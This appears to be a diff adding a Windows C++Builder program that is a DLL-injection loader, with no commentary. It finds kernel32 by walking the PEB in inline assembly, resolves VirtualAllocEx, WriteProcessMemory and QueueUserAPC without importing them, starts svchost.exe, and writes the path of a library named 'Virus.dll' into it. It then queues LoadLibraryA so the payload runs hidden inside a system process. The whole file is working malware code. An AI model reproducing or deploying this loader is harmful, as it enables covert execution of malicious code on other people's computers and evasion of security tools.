@@ -1,0 +1,88 @@
+#include <vcl.h>
+#pragma hdrstop
+#include <tchar.h>
+
+DWORD GetKernel32Mod()
+{
+	DWORD dRetn = 0;
+	asm
+	{
+		mov ebx,fs:[0x30] //PEB
+		mov ebx,[ebx+0x0c]//Ldr
+		mov ebx,[ebx+0x1c]//InInitializationOrderModuleList
+		Search:
+		mov eax,[ebx+0x08]//Point to Current Modual Base.
+		mov ecx,[ebx+0x20]//Point to Current Name.
+		mov ecx,[ecx+0x18]
+		cmp cl,0x00//Test if Name[25] == \x00.
+		mov ebx,[ebx+0x00]
+		jne Search
+		mov [dRetn],eax
+	}
+	return dRetn;
+}
+
+PROCESS_INFORMATION CreateSvchost()
+{
+	STARTUPINFO StartInfo = {};
+	PROCESS_INFORMATION ProcInfo = {};
+	StartInfo.cb = sizeof(StartInfo);
+	int result = CreateProcess(L"C:\\Windows\\system32\\svchost.exe",
+								0,
+								0,
+								0,
+								0,
+								0,
+								0,
+								0,
+								&StartInfo,
+								&ProcInfo);
+	return ProcInfo;
+}
+
+
+void InjectFunc()
+{
+	AnsiString CurPath = ExtractFilePath(Application->ExeName);
+	char* DllPath = AnsiString(CurPath + "Virus.dll").c_str() ;
+	DWORD DllPathLen = strlen(DllPath) + 1;
+
+	HMODULE Kernel32_Addr = (HMODULE)GetKernel32Mod();
+	FARPROC LoadLibraryA_Addr = GetProcAddress(Kernel32_Addr,"LoadLibraryA");
+
+	int __stdcall (*nVallocEx)(
+	HANDLE hProcess,
+	LPVOID lpAddress,
+	SIZE_T dwSize,
+	DWORD flAllocationType,
+	DWORD flProtect
+	) = (int (__stdcall*)(void*,void*,DWORD,DWORD,DWORD))GetProcAddress(Kernel32_Addr,"VirtualAllocEx");
+
+	bool __stdcall (*nWPM)(
+	HANDLE hProcess,
+	LPVOID lpBaseAddress,
+	LPCVOID lpBuffer,
+	SIZE_T nSize,
+	SIZE_T * lpNumberOfBytesWritten
+	) = (bool (__stdcall*)(HANDLE,LPVOID,LPCVOID ,SIZE_T,SIZE_T *))GetProcAddress(Kernel32_Addr,"WriteProcessMemory");
+
+	DWORD __stdcall (*nAPC)(
+	PAPCFUNC pfnAPC,
+	HANDLE hThread,
+	ULONG_PTR dwData
+	) = (DWORD (__stdcall*)(PAPCFUNC,HANDLE,ULONG_PTR))GetProcAddress(Kernel32_Addr,"QueueUserAPC");
+
+	PROCESS_INFORMATION Svchost_Info = CreateSvchost();
+	PVOID param = (PVOID)nVallocEx( Svchost_Info.hProcess , 0, DllPathLen ,MEM_COMMIT | MEM_TOP_DOWN,PAGE_READWRITE);
+	if (!param) return;
+	nWPM(Svchost_Info.hProcess , param,(LPVOID)DllPath, DllPathLen, 0);
+	nAPC((PAPCFUNC)LoadLibraryA_Addr,Svchost_Info.hThread ,(DWORD)param);
+}
+
+
+int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, int)
+{
+	InjectFunc();
+	return 0;
+}
+//---------------------------------------------------------------------------
